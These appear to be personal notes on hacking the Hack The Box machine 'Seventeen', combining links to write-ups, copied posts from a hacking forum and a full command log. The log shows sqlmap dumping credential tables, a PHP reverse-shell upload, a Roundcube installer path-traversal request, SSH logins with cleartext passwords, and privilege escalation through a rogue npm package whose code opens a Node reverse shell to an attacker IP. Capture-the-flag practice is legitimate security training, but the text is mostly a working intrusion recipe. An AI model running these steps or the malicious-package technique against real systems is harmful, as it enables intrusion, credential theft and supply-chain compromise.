writeup https://gatogamer1155.github.io/hackthebox/seventeen
writeup https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html#shell-as-mark-seventeen
  sshpass -p '2020bestyearofmylife' ssh mark@seventeen.htb
  sshpass -p 'IhateMathematics123#' ssh kavi@seventeen.htb
writeup https://vato.cc/hackthebox-writeup-seventeen

---
@ https://breached.to/Thread-Seventeen-HTB-Discussion?pid=113901#pid113901
The steps so far are:
1. Discover exam subdomain
2. SQLi on the id parameter
3. Dump student credentials from DB
4. Login into student panel
5. Upload malicious shell, BUT, you need to modify the stud_no parameter to "31234/.." , because PHP execution inside the 31234 folder is blocked
6 You can trigger the shell directly through seventeen.htb:8000/oldmanager/files/shell.php OR it can be triggered through a CVE of Roundcube. Obviously it doesn't make sense to complicate the situation, but I have a hunch that the Roundcube CVE was supposed to be the intended way, and that the machine maker just messed with .htaccess file. So most likely the steps were supposed to be:
6.1 Go to mailmaster.seventeen.htb:8000/mailmaster/installer
6.2 Upload a new configuration, where you will intercept and modify one of the _plugins_NAME parameters
_step=2&_product_name=Seventeen+Webmail&_support_url=&_skin_logo=&_temp_dir=%2Fvar%2Fwww%2Fhtml%2Fmastermailer%2Ftemp%2F&_des_key=iajOofMkjvHYKGsQZzdASvEh&_spellcheck_engine=googie&_identities_level=0&_log_driver=file&_log_dir=%2Fvar%2Fwww%2Fhtml%2Fmastermailer%2Flogs%2F&_syslog_id=roundcube&_syslog_facility=8&_dbtype=mysql&_dbhost=127.0.0.1&_dbname=roundcubedb&_dbuser=mysqluser&_dbpass=mysqlpassword&_db_prefix=&_default_host%5B%5D=127.0.0.1&_default_port=143&_username_domain=&_auto_create_user=1&_sent_mbox=Sent&_trash_mbox=Trash&_drafts_mbox=Drafts&_junk_mbox=Junk&_smtp_server=127.0.0.1&_smtp_port=587&_smtp_user=%25u&_smtp_pass=%25p&_smtp_user_u=1&_language=&_skin=elastic&_mail_pagesize=50&_addressbook_pagesize=50&_htmleditor=0&_draft_autosave=300&_mdn_requests=0&_mime_param_folding=1&_plugins_example_addressbook=example_addressbook&_plugins_filesystem_attachments=filesystem_attachments&_plugins_help=../../../../../../../../var/www/html/oldmanagement/files/31234&submit=UPDATE+CONFIG
This will make roundcube load a file at path /var/www/html/mastermailer/plugins/../../../../../../var/www/html/oldmanagement/files/31234/../../../../../../var/www/html/oldmanagement/files/31234.php, which means that both the path 31234 and the file called 31234.php need to exist at the same level.
7. Once a shell is obtained in the container, you can find the credentials for Mark in the dbh.php file
8. SSH into the box as Mark
Here is were I stopped.
- The file where other users have previously found the password for kavi user is not readable anymore
- The /opt/app/node_modules/ directory is not writeable anymore, so the rogue JS package cannot be just written there
- There is a Verdaccio registry locally at port 4873, I am assuming that we should find a way to publish packages through it, but user registration is disabled and no anonymous publishing is allowed (and nor mark nor kavi have access to it). The configuration of verdaccio is not even readable (/etc/verdaccio).
- There is a whole mail stack on the machine, it is really strange that it would be completely useless for the machine to be solved.
- There is another web app on port 31225 which I am not sure what it is.
If someone finds a legit way to get the password for the kavi user (i.e., not just from /opt/app/node_modules/db-logger) would be nice, I am giving up on this machine because it seems to be really poorly made and at this point is just a waste of time without much learning.

---
@ https://breached.to/Thread-Seventeen-HTB-Discussion?pid=191540#pid191540
from mark's home folder, create ".npmrc" file: registry=http://127.0.0.1:4873
then, npm install db-logger
the package will be installed under "node_modules" folder
===

Changelog
30TH MAY, 2022
[~]CHANGE Patched Unintendeds
Patched unintended vulnerabilities in web applications that led to rabbitholes and wasted player time. Patched unintended root shortcut.

/etc/hosts: 10.10.11.165 seventeen.htb exam.seventeen.htb

$ sudo nmap -sC -sS -sV -Pn -T5 10.10.11.165
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
  |   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
  |_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
  80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Let's begin your education with us!
  8000/tcp open  http    Apache httpd 2.4.38
  |_http-server-header: Apache/2.4.38 (Debian)
  |_http-title: 403 Forbidden
  Service Info: Host: 172.17.0.11; OS: Linux; CPE: cpe:/o:linux:linux_kernel
$ masscan -p1-65535,U:1-65535 10.10.11.165 --rate=1000 -e utun5 | egrep -o "[0-9]+/(tcp|udp)" | sort -n
  22/tcp
  80/tcp
  8000/tcp

$ curl -s 10.10.11.165 | grep seventeen | html2text | head -n1
seventeen.htb

@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt
$ gobuster vhost -u seventeen.htb -w subdomains-top1million-5000.txt -t 100
Found: gc._msdcs.seventeen.htb (Status: 400) [Size: 301]
Found: exam.seventeen.htb (Status: 200) [Size: 17375]

$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" --batch -dbs
  web server operating system: Linux Debian 10 (buster)
  web application technology: PHP, PHP 7.2.34, Apache 2.4.38
  back-end DBMS: MySQL >= 5.0.12
  available databases [4]:
  [*] db_sfms
  [*] erms_db
  [*] information_schema
  [*] roundcubedb
$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" --batch --threads $(nproc) -D db_sfms --dump
Table: storage
+----------+---------+----------------------+-----------------+----------------------+
| store_id | stud_no | filename             | file_type       | date_uploaded        |
+----------+---------+----------------------+-----------------+----------------------+
| 33       | 31234   | Marksheet-finals.pdf | application/pdf | 2020-01-26, 06:57 PM |
+----------+---------+----------------------+-----------------+----------------------+
Table: student
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
Table: user
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| user_id | status        | lastname      | password                         | username         | firstname     |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
+---------+---------------+---------------+----------------------------------+------------------+---------------+

# @ http://seventeen.htb:8000/oldmanagement
Student no: 31234
Password: autodestruction
# @ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
# @ https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
[x] upload PHP reverse shell @ http://seventeen.htb:8000/oldmanagement/student_profile.php

$ ssh mark@10.10.11.165
mark@10.10.11.165's password: 2020bestyearofmylife
mark@seventeen:~$ cat user.txt
user.txt: 67fb28640f8cdd04ac1e6d57b6d0101c

$ ssh kavi@10.10.11.165
kavi@10.10.11.165's password: IhateMathematics123#
kavi@seventeen:~$ sudo -l
[sudo] password for kavi: IhateMathematics123#
Matching Defaults entries for kavi on seventeen:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User kavi may run the following commands on seventeen:
  (ALL) /opt/app/startup.sh
/opt/app/startup.sh:
  #!/bin/bash
  cd /opt/app
  deps=('db-logger' 'loglevel')
  for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)
    if [[ "$o" != *"$dep"* ]]; then
      /bin/echo "[+] Installing $dep"
      /usr/bin/npm install $dep --silent
      /bin/chown root:root node_modules -R
    else
      /bin/echo "[+] $dep already installed"
    fi
  done
  /bin/echo "[+] Starting the app"
  /usr/bin/node /opt/app/index.js
kavi@seventeen:~$ sudo /opt/app/startup.sh
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.0
└── mysql@2.18.1
[+] Starting the app

// $ docker run -it --rm --name verdaccio -p 4873:4873 -e 'VERDACCIO_PUBLIC_URL=http://10.10.14.2' verdaccio/verdaccio
$ docker run -it --rm --name verdaccio -p 4873:4873 verdaccio/verdaccio
$ npm adduser --registry http://127.0.0.1:4873
Username: username
Password: password
Email: (this IS public) user@email.com
Logged in as username on http://127.0.0.1:4873

$ npm init
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.
See `npm help init` for definitive documentation on these fields
and exactly what they do.
Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.
Press ^C at any time to quit.
package name: (loglevel)
version: (1.0.0) 2.0.0
description:
entry point: (index.js)
test command:
git repository:
keywords:
author:
license: (ISC)
About to write to /loglevel/package.json:
{
  "name": "loglevel",
  "version": "2.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}
Is this OK? (yes)
# @ https://www.unixtutorial.org/how-to-generate-ed25519-ssh-key
$ ssh-keygen -t ed25519 -C "seventeen.htb"
$ npm publish --registry http://127.0.0.1:4873

kavi@seventeen:~$ echo -n "registry=http://10.10.14.2:4873" >/home/kavi/.npmrc
kavi@seventeen:~$ sudo /opt/app/startup.sh
[sudo] password for kavi: IhateMathematics123#
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.0
└── mysql@2.18.1
[+] Starting the app
$ ssh -i id_ed25519 root@10.10.11.165

mark@seventeen:~$ echo -n "registry=http://127.0.0.1:4873" >"${HOME}/.npmrc"
mark@seventeen:~$ npm install db-logger
/db-logger/logger.js:
  var mysql = require("mysql");
  var con = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: "IhateMathematics123#",
    database: "logger"
  });
  function log(msg) {
    con.connect(function(err) {
      if (err) throw err;
      var date = Date();
      var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
      con.query(sql, function (err, result) {
      if (err) throw err;
      console.log("[+] Logged");
      });
    });
  };
  module.exports.log = log

$ docker exec -it verdaccio sh
/verdaccio/storage/data/loglevel/loglevel.js:
function log(msg)
{
  var net=require("net"), sh=require("child_process").exec("/bin/bash");
  var client = new net.Socket();
  client.connect(1337,"10.10.14.2",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
  sh.stderr.pipe(client);});
}
module.exports = {log};
root.txt: 0701c44400cfa8ec4d837e441b06d50a
